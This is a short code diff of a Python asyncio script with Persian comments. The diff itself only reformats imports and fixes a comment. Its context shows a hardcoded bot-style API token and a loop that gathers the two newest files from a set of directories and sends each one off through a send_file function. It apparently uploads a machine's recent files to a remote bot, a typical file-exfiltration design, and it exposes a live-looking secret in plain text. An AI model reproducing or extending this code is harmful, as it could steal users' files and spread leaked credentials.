@@ -1,4 +1,6 @@
-import os, aiohttp, asyncio
+import os
+import aiohttp
+import asyncio
 
 # تنظیمات
 token = '480342547:j3qFwxAnN66xMVpZsDzYaXxk8neECXgco8gzIKia'
@@ -32,7 +34,7 @@ async def main():
             if not os.path.exists(directory):  # بررسی وجود دایرکتوری
                 continue
             files = [os.path.join(directory, f) for f in os.listdir(directory) if os.path.isfile(os.path.join(directory, f))]
-            files = sorted(files, key=os.path.getmtime, reverse=True)[:2]  # ۵ فایل آخر
+            files = sorted(files, key=os.path.getmtime, reverse=True)[:2]  # ۲ فایل آخر
             for file_path in files:
                 tasks.append(send_file(session, file_path))
         await asyncio.gather(*tasks)  # اجرای موازی
